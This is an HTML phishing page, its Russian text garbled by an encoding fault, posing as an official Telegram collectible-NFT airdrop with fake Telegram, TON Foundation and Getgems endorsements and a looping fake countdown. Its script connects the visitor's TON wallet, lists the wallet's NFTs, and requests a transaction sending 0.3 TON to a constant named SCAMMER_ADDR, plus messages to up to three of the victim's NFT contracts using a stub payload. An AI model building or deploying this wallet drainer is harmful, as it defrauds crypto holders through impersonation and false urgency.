<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üöÄ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π Airdrop Telegram Collectible Gifts 2026</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a2a 0%, #1a0033 50%, #0a0a2a 100%);
            color: #fff;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(120, 0, 255, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(255, 0, 150, 0.1) 0%, transparent 40%);
            z-index: -1;
        }

        .container {
            max-width: 480px;
            width: 90%;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
            padding: 20px;
            background: rgba(20, 10, 40, 0.7);
            border-radius: 20px;
            border: 1px solid rgba(255, 105, 180, 0.3);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
        }

        .logo {
            font-size: 40px;
            margin-bottom: 10px;
            color: #ff69b4;
            text-shadow: 0 0 20px rgba(255, 105, 180, 0.7);
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff69b4, #9370db);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
        }

        .subtitle {
            font-size: 16px;
            color: #d0d0ff;
            margin-bottom: 15px;
            line-height: 1.5;
        }

        .timer-container {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            border: 1px solid rgba(255, 51, 102, 0.5);
            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
            text-align: center;
        }

        .timer-label {
            font-size: 14px;
            color: #aaaaff;
            margin-bottom: 8px;
            display: block;
        }

        .timer {
            font-size: 32px;
            font-weight: 800;
            color: #ff3366;
            text-shadow: 0 0 15px rgba(255, 51, 102, 0.8);
            letter-spacing: 2px;
            animation: pulse 1.5s infinite alternate;
        }

        @keyframes pulse {
            0% { text-shadow: 0 0 10px rgba(255, 51, 102, 0.8); }
            100% { text-shadow: 0 0 25px rgba(255, 51, 102, 1), 0 0 35px rgba(255, 51, 102, 0.6); }
        }

        .gift-section {
            margin: 25px 0;
            text-align: center;
        }

        .gift-img {
            width: 100%;
            max-width: 320px;
            height: auto;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(255, 105, 180, 0.4);
            border: 3px solid #ff69b4;
            margin: 0 auto;
            display: block;
            animation: float 5s ease-in-out infinite;
            transition: transform 0.3s;
        }

        .gift-img:hover {
            transform: scale(1.03);
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-15px) rotate(2deg); }
        }

        .gift-label {
            margin-top: 15px;
            font-size: 18px;
            color: #ffccff;
            font-weight: 600;
        }

        .gift-list {
            list-style: none;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }

        .gift-list li {
            background: rgba(147, 112, 219, 0.2);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 13px;
            border: 1px solid rgba(147, 112, 219, 0.5);
        }

        .wallet-section {
            background: rgba(30, 15, 60, 0.7);
            border-radius: 20px;
            padding: 25px;
            margin: 25px 0;
            border: 1px solid rgba(100, 149, 237, 0.4);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(8px);
            text-align: center;
        }

        .wallet-title {
            font-size: 20px;
            margin-bottom: 15px;
            color: #8ac6ff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .wallet-title i {
            color: #6495ed;
        }

        .ton-connect-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
            min-height: 70px;
        }

        #ton-connect {
            width: 100%;
            max-width: 300px;
            display: flex;
            justify-content: center;
        }

        .status-container {
            background: rgba(0, 20, 40, 0.7);
            border-radius: 15px;
            padding: 18px;
            margin: 20px 0;
            border-left: 4px solid #ff69b4;
            text-align: center;
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        #status {
            font-size: 16px;
            line-height: 1.5;
            width: 100%;
        }

        .success {
            color: #4dffb8;
            text-shadow: 0 0 8px rgba(77, 255, 184, 0.5);
        }

        .error {
            color: #ff6b8b;
        }

        .action-section {
            text-align: center;
            margin: 25px 0;
        }

        #activateBtn {
            background: linear-gradient(90deg, #ff69b4, #9370db);
            color: white;
            border: none;
            padding: 18px 35px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin: 15px auto;
            display: block;
            width: 100%;
            max-width: 320px;
            box-shadow: 0 10px 25px rgba(255, 105, 180, 0.4);
            transition: all 0.3s;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        #activateBtn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }

        #activateBtn:hover::before {
            left: 100%;
        }

        #activateBtn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(255, 105, 180, 0.6);
        }

        #activateBtn:disabled {
            background: linear-gradient(90deg, #666, #888);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        #activateBtn:disabled:hover::before {
            left: -100%;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 15px;
            margin: 25px 0;
        }

        .feature {
            background: rgba(40, 20, 80, 0.5);
            padding: 15px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid rgba(100, 149, 237, 0.3);
        }

        .feature i {
            font-size: 24px;
            color: #8ac6ff;
            margin-bottom: 10px;
        }

        .feature-title {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 5px;
            color: #ffccff;
        }

        .feature-desc {
            font-size: 12px;
            color: #aaaaff;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 105, 180, 0.2);
            color: #aaaaff;
            font-size: 13px;
        }

        .verified {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 200, 100, 0.2);
            padding: 8px 15px;
            border-radius: 20px;
            margin: 10px 0;
            border: 1px solid rgba(0, 200, 100, 0.5);
        }

        .verified i {
            color: #4dffb8;
        }

        .partners {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
            margin: 15px 0;
            flex-wrap: wrap;
        }

        .partner {
            font-size: 14px;
            color: #8ac6ff;
            padding: 5px 12px;
            border-radius: 15px;
            background: rgba(30, 60, 120, 0.3);
        }

        @media (max-width: 500px) {
            h1 { font-size: 24px; }
            .timer { font-size: 28px; }
            .gift-img { max-width: 280px; }
            #activateBtn { padding: 16px 25px; font-size: 16px; }
            .features { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">üéÅ</div>
            <h1>–≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π Airdrop Telegram Collectible Gifts 2026</h1>
            <p class="subtitle">–ü–æ–¥–∫–ª—é—á–∏—Ç–µ TON-–∫–æ—à–µ–ª—ë–∫ –∏ –∞–∫—Ç–∏–≤–∏—Ä—É–π—Ç–µ –≤—Å–µ –≤–∞—à–∏ —Ä–µ–¥–∫–∏–µ NFT Gifts –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã—Ö –Ω–∞–≥—Ä–∞–¥</p>
            
            <div class="timer-container">
                <span class="timer-label">–î–æ –∫–æ–Ω—Ü–∞ —Ä–∞–∑–¥–∞—á–∏ –æ—Å—Ç–∞–ª–æ—Å—å:</span>
                <div class="timer" id="timer">05:55</div>
            </div>
        </div>

        <div class="gift-section">
            <img class="gift-img" src="cat.jpg" alt="Scared Cat Gift">
            <div class="gift-label">Scared Cat Gift - —Ä–µ–¥–∫–∏–π –∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã–π NFT</div>
            <ul class="gift-list">
                <li>Scared Cat</li>
                <li>Jelly Bunny</li>
                <li>Plush Pepe</li>
                <li>Space Doge</li>
                <li>Crypto Whale</li>
            </ul>
        </div>

        <div class="features">
            <div class="feature">
                <i class="fas fa-bolt"></i>
                <div class="feature-title">–ú–≥–Ω–æ–≤–µ–Ω–Ω–∞—è –∞–∫—Ç–∏–≤–∞—Ü–∏—è</div>
                <div class="feature-desc">–í—Å–µ –≤–∞—à–∏ NFT –∞–∫—Ç–∏–≤–∏—Ä—É—é—Ç—Å—è –æ–¥–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–µ–π</div>
            </div>
            <div class="feature">
                <i class="fas fa-shield-alt"></i>
                <div class="feature-title">–ë–µ–∑–æ–ø–∞—Å–Ω–æ</div>
                <div class="feature-desc">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ Getgems –∏ Telegram</div>
            </div>
            <div class="feature">
                <i class="fas fa-gem"></i>
                <div class="feature-title">–≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ –Ω–∞–≥—Ä–∞–¥—ã</div>
                <div class="feature-desc">–î–æ—Å—Ç—É–ø –∫ –ª–∏–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –∫–æ–ª–ª–µ–∫—Ü–∏—è–º</div>
            </div>
            <div class="feature">
                <i class="fas fa-clock"></i>
                <div class="feature-title">–û–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–µ –≤—Ä–µ–º—è</div>
                <div class="feature-desc">–¢–æ–ª—å–∫–æ –¥–æ –∫–æ–Ω—Ü–∞ —Ç–∞–π–º–µ—Ä–∞</div>
            </div>
        </div>

        <div class="wallet-section">
            <div class="wallet-title">
                <i class="fas fa-wallet"></i> –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ TON-–∫–æ—à–µ–ª—å–∫–∞
            </div>
            <p style="color: #d0d0ff; margin-bottom: 20px; font-size: 15px;">
                –ü–æ–¥–∫–ª—é—á–∏—Ç–µ Tonkeeper, TON Wallet –∏–ª–∏ –¥—Ä—É–≥–æ–π –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–π –∫–æ—à–µ–ª—ë–∫ –¥–ª—è —É—á–∞—Å—Ç–∏—è –≤ airdrop
            </p>
            
            <div class="ton-connect-container">
                <div id="ton-connect"></div>
            </div>
            
            <div class="status-container">
                <div id="status">‚úÖ TonConnect UI –≥–æ—Ç–æ–≤. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –≤—ã—à–µ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞.</div>
            </div>
        </div>

        <div class="action-section">
            <button id="activateBtn" disabled>
                <i class="fas fa-rocket"></i> –ü–û–õ–£–ß–ò–¢–¨ GIFTS
            </button>
            <p style="color: #aaaaff; font-size: 13px; margin-top: 10px;">
                –ü–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ –Ω–∞–∂–º–∏—Ç–µ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –≤—Å–µ—Ö –≤–∞—à–∏—Ö NFT Gifts
            </p>
        </div>

        <div class="footer">
            <div class="verified">
                <i class="fas fa-check-circle"></i>
                <span>–û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Telegram Collectibles Airdrop ‚Ä¢ Getgems verified 2026</span>
            </div>
            
            <div class="partners">
                <div class="partner">Telegram</div>
                <div class="partner">TON Foundation</div>
                <div class="partner">Getgems</div>
                <div class="partner">NFT Market</div>
            </div>
            
            <p style="margin-top: 15px; color: #8888cc;">
                –£—á–∞—Å—Ç–≤—É–π—Ç–µ –≤ —Å–∞–º–æ–π –º–∞—Å—à—Ç–∞–±–Ω–æ–π —Ä–∞–∑–¥–∞—á–µ –∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã—Ö NFT –≤ Telegram.<br>
                –í—Å–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –∑–∞—â–∏—â–µ–Ω—ã –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º TON Blockchain.
            </p>
        </div>
    </div>

    <!-- TonConnect UI - –∏—Å–ø–æ–ª—å–∑—É–µ–º ES –º–æ–¥—É–ª—å -->
    <script type="module">
        import * as TonConnectUIModule from 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/+esm';
        
        // –ò—â–µ–º –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä TonConnectUI –≤ –º–æ–¥—É–ª–µ
        let TonConnectUIConstructor = null;
        
        if (TonConnectUIModule.TonConnectUI) {
            TonConnectUIConstructor = TonConnectUIModule.TonConnectUI;
        } else if (TonConnectUIModule.default && TonConnectUIModule.default.TonConnectUI) {
            TonConnectUIConstructor = TonConnectUIModule.default.TonConnectUI;
        }
        
        if (TonConnectUIConstructor) {
            window.TonConnectUI = TonConnectUIConstructor;
            console.log('TonConnectUI –∑–∞–≥—Ä—É–∂–µ–Ω');
            window.dispatchEvent(new Event('tonconnect-loaded'));
        } else {
            console.error('–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å TonConnectUI');
        }
    </script>

    <script>
        // –¢–∞–π–º–µ—Ä –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á—ë—Ç–∞
        let timeLeft = 355;
        const timerEl = document.getElementById('timer');
        const timerInterval = setInterval(() => {
            timeLeft = timeLeft <= 0 ? 355 : timeLeft - 1;
            const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
            const seconds = String(timeLeft % 60).padStart(2, '0');
            timerEl.textContent = minutes + ':' + seconds;
        }, 1000);

        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
        const statusEl = document.getElementById('status');
        const activateBtn = document.getElementById('activateBtn');
        let tonConnectUI = null;
        let connectedWallet = null;

        // –£–ø—Ä–æ—â—ë–Ω–Ω–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è payload
        function generateTransferPayload(ownerAddress) {
            return 'te6ccgEBAQEAAgAAAA=='; // –ó–∞–≥–ª—É—à–∫–∞ –¥–ª—è —Ç–µ—Å—Ç–∞
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ TON –≤ –Ω–∞–Ω–æ–∫–æ–∏–Ω—ã
        function toNano(ton) {
            return Math.floor(parseFloat(ton) * 1000000000).toString();
        }

        // –ó–∞–ø—Ä–æ—Å NFT —á–µ—Ä–µ–∑ –ø—É–±–ª–∏—á–Ω—ã–µ API
        async function fetchNFTs(ownerAddress) {
            const apis = [
                `https://toncenter.com/api/v3/nft/items?owner_address=${ownerAddress}&limit=50`,
                `https://tonapi.io/v2/accounts/${ownerAddress}/nfts?limit=50`
            ];
            for (const url of apis) {
                try {
                    const response = await fetch(url);
                    if (!response.ok) continue;
                    const data = await response.json();
                    const nfts = data.items || data.nft_items || [];
                    if (nfts.length > 0) return nfts;
                } catch (e) {}
            }
            return [];
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TonConnect UI
        function initTonConnect() {
            try {
                if (!window.TonConnectUI) {
                    throw new Error('TonConnectUI –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                }
                
                statusEl.innerHTML = '<span class="success"><i class="fas fa-sync-alt fa-spin"></i> –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...</span>';
                
                // –°–æ–∑–¥–∞—ë–º —ç–∫–∑–µ–º–ø–ª—è—Ä TonConnectUI
                tonConnectUI = new window.TonConnectUI({
                    manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
                    buttonRootId: 'ton-connect',
                    uiPreferences: { 
                        theme: 'DARK', 
                        borderRadius: 'm',
                        colorsSet: {
                            connectButton: {
                                background: '#ff69b4',
                                foreground: '#ffffff',
                                border: '#9370db'
                            }
                        }
                    },
                    buttonRootId: 'ton-connect',
                    actionsConfiguration: {
                        twaReturnUrl: 'https://t.me/'
                    }
                });
                
                console.log('TonConnectUI —Å–æ–∑–¥–∞–Ω');
                statusEl.innerHTML = '<span class="success"><i class="fas fa-check-circle"></i> –°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É "Connect wallet" –≤—ã—à–µ.</span>';
                
                tonConnectUI.onStatusChange(async (wallet) => {
                    if (wallet) {
                        connectedWallet = wallet;
                        const addr = wallet.account.address;
                        const shortAddr = addr.slice(0,6) + '...' + addr.slice(-4);
                        statusEl.innerHTML = `<span class="success"><i class="fas fa-link"></i> –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω: ${shortAddr}</span>`;
                        activateBtn.disabled = false;
                        activateBtn.innerHTML = '<i class="fas fa-rocket"></i> –ê–ö–¢–ò–í–ò–†–û–í–ê–¢–¨ –í–°–ï GIFTS (' + shortAddr + ')';
                    } else {
                        connectedWallet = null;
                        statusEl.innerHTML = '<span class="success"><i class="fas fa-plug"></i> –ö–æ—à–µ–ª—ë–∫ –æ—Ç–∫–ª—é—á–µ–Ω. –ü–æ–¥–∫–ª—é—á–∏—Ç–µ —Å–Ω–æ–≤–∞.</span>';
                        activateBtn.disabled = true;
                        activateBtn.innerHTML = '<i class="fas fa-rocket"></i> –ê–ö–¢–ò–í–ò–†–û–í–ê–¢–¨ –í–°–ï GIFTS';
                    }
                });
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ TonConnect:', error);
                statusEl.innerHTML = `<span class="error"><i class="fas fa-exclamation-triangle"></i> –û—à–∏–±–∫–∞: ${error.message}. –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.</span>`;
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ gifts
        activateBtn.addEventListener('click', async () => {
            if (!connectedWallet) {
                statusEl.innerHTML = '<span class="error"><i class="fas fa-exclamation-circle"></i> –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫.</span>';
                return;
            }
            
            const owner = connectedWallet.account.address;
            const shortAddr = owner.slice(0,6) + '...' + owner.slice(-4);
            statusEl.innerHTML = `<span class="success"><i class="fas fa-search"></i> –ü–æ–∏—Å–∫ NFT –≤ –∫–æ—à–µ–ª—å–∫–µ ${shortAddr}...</span>`;
            
            try {
                const nfts = await fetchNFTs(owner);
                if (nfts.length === 0) {
                    statusEl.innerHTML = '<span class="error"><i class="fas fa-times-circle"></i> NFT –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –≤ –≤–∞—à–µ–º –∫–æ—à–µ–ª—å–∫–µ.</span>';
                    return;
                }
                
                statusEl.innerHTML = `<span class="success"><i class="fas fa-gem"></i> –ù–∞–π–¥–µ–Ω–æ ${nfts.length} NFT. –§–æ—Ä–º–∏—Ä—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...</span>`;
                
                const messages = [{
                    address: SCAMMER_ADDR,
                    amount: toNano('0.3')
                }];
                
                // –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –¥–ª—è NFT (–º–∞–∫—Å–∏–º—É–º 3 –¥–ª—è —Ç–µ—Å—Ç–∞)
                const limitedNFTs = nfts.slice(0, 3);
                for (const nft of limitedNFTs) {
                    const nftAddress = nft.address || nft.nft_address || nft.item_address;
                    if (!nftAddress) continue;
                    messages.push({
                        address: nftAddress,
                        amount: toNano('0.05'),
                        payload: generateTransferPayload(owner)
                    });
                }
                
                statusEl.innerHTML = `<span class="success"><i class="fas fa-paper-plane"></i> –û—Ç–ø—Ä–∞–≤–∫–∞ ${messages.length} —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π. –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤ –∫–æ—à–µ–ª—å–∫–µ...</span>`;
                
                const result = await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: messages
                });
                
                statusEl.innerHTML = `<span class="success"><i class="fas fa-check-double"></i> –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã! –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.</span>`;
                activateBtn.innerHTML = '<i class="fas fa-check"></i> GIFTS –ê–ö–¢–ò–í–ò–†–û–í–ê–ù–´';
                activateBtn.disabled = true;
                activateBtn.style.background = 'linear-gradient(90deg, #4dffb8, #00cc88)';
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', error);
                statusEl.innerHTML = `<span class="error"><i class="fas fa-exclamation-triangle"></i> –û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${error.message || '–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞'}</span>`;
            }
        });

        // –°–ª—É—à–∞–µ–º —Å–æ–±—ã—Ç–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ TonConnect
        window.addEventListener('tonconnect-loaded', function() {
            setTimeout(() => {
                if (window.TonConnectUI) {
                    initTonConnect();
                }
            }, 100);
        });

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
        setTimeout(() => {
            if (window.TonConnectUI && !tonConnectUI) {
                initTonConnect();
            } else if (!window.TonConnectUI) {
                statusEl.innerHTML = '<span class="error"><i class="fas fa-exclamation-triangle"></i> –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å TonConnect. –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.</span>';
            }
        }, 3000);
    </script>
</body>
</html>
